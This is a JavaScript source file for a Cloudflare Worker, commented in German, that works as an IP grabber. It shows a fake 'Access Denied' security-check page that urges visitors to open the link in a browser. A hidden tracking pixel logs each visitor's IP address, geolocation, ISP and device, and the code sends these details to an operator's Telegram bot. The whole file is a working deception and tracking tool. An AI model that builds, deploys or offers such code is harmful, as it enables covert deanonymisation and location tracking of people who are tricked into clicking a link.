export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);

    // --- TEIL 1: DIE FAKE-WEBSITE ---
    if (url.pathname === "/" || url.pathname === "/leak") {
      const tag = url.searchParams.get('c') || 'default';
      
      const html = `
      <!DOCTYPE html>
      <html lang="en">
      <head>
          <meta charset="UTF-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <title>Security Check</title>
          <style>
              body { background-color: #0f0f0f; color: #ffffff; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
              .container { background: #1a1a1a; padding: 40px 20px; border-radius: 8px; border: 1px solid #333; max-width: 400px; width: 90%; }
              h1 { color: #ff4444; font-size: 20px; margin-bottom: 10px; }
              p { color: #aaaaaa; font-size: 14px; margin-bottom: 30px; line-height: 1.5; }
              .btn { display: block; width: 100%; padding: 15px; background-color: #ffffff; color: #000000; text-decoration: none; font-weight: bold; font-size: 16px; border-radius: 5px; box-sizing: border-box; }
          </style>
      </head>
      <body>
          <div class="container">
              <h1>Access Denied</h1>
              <p>This session is not supported. Please open in a secure browser to continue.</p>
              
              <!-- TRACKER -->
              <img src="/pixel?c=${tag}" style="display:none;" />

              <!-- BUTTON -->
              <a href="${url.origin}/?c=${tag}&browser=1" class="btn">Open in Browser</a>
          </div>
      </body>
      </html>
      `;
      return new Response(html, { headers: { "Content-Type": "text/html; charset=utf-8" } });
    }

    // --- TEIL 2: DER LOGGER ---
    if (url.pathname === "/pixel") {
      const ip = request.headers.get("CF-Connecting-IP") || "unknown";
      const ua = request.headers.get("User-Agent") || "unknown";
      const tag = url.searchParams.get("c") || "unbekannt";
      const t = new Date().toLocaleString("de-DE", { timeZone: "Europe/Berlin" });

      let loc = "Unbekannt", isp = "Unbekannt", asn = "Unbekannt", timezone = "Unbekannt";
      
      try {
        // Zuverlässigere API
        const res = await fetch(`https://ipwho.is/${ip}`);
        const data = await res.json();
        if (data.success) {
          loc = `${data.city || '?'}, ${data.region || '?'}, ${data.country || '?'}`;
          isp = data.connection?.isp || "?";
          asn = `AS${data.connection?.asn || '?'} (${data.connection?.org || '?'})`;
          timezone = data.timezone?.id || "?";
        }
      } catch (e) {}

      if (env.BOT_TOKEN && env.CHAT_ID) {
        const isTelegram = ua.includes("Telegram");
        const source = isTelegram ? "TELEGRAM (Fake IP)" : "BROWSER (Echte IP)";
        
        // Formatierung: Ganz oben der Tag, dann die Daten
        const msg = 
          `[${tag}]\n` +
          `Quelle: ${source}\n` +
          `-------------------\n` +
          `IP: ${ip}\n` +
          `Ort: ${loc}\n` +
          `ISP: ${isp}\n` +
          `ASN: ${asn}\n` +
          `Timezone: ${timezone}\n` +
          `Zeit: ${t}\n` +
          `-------------------\n` +
          `Device: ${ua.slice(0, 50)}...`;

        try {
          await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: env.CHAT_ID, text: msg })
          });
        } catch (e) {}
      }

      const gif = Uint8Array.from(atob("R0lGODlhAQABAIAAAAAAAP///ywAAAAAAQABAAACAUwAOw=="), c => c.charCodeAt(0));
      return new Response(gif, { headers: { "Content-Type": "image/gif", "Cache-Control": "no-store" } });
    }

    return new Response("404 Not Found", { status: 404 });
  }
};
